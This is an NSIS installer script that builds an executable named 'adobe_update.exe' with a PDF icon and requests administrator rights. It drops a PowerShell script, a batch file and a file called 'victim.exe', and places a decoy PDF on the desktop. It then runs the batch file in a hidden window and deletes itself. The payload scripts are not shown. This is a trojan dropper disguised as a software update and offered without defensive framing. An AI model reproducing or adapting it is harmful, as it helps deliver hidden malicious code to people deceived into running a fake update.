!include "MUI2.nsh"

; Define the name of the installer
Name "MyApp"
OutFile "adobe_update.exe"
InstallDir "$PROGRAMFILES\MyApp"

; Request application privileges
RequestExecutionLevel admin

; Set the icon for the installer
Icon "pdf1.ico" ; Ensure this file exists in the same directory as the NSIS script

; Section to handle the installation
Section "MainSection" SEC01
    ; Output path for the main files
    SetOutPath "$INSTDIR"

    ; Add files to the destination folder
    File "script.ps1"
    File "run_script.bat"
    File "victim.exe" ; Include the executable file directly

    ; Install the PDF on the Desktop
    SetOutPath "$DESKTOP"
    File "adobe.pdf"

  

    ; Run the batch file silently
    ExecShell "" "$INSTDIR\run_script.bat" "" SW_HIDE

    ; Optionally, open the PDF file automatically
    ; ExecShell "" "$DESKTOP\adobe.pdf"

    ; Delete the installer executable after installation
    Delete "$EXEDIR\adobe_update.exe"

    ; Close the installer window
    Quit
SectionEnd

; Uninstaller section
Section "Uninstall"
    ; Delete files
    Delete "$INSTDIR\script.ps1"
    Delete "$INSTDIR\run_script.bat"
    Delete "$INSTDIR\Uninstall.exe"
    RMDir "$INSTDIR"
SectionEnd
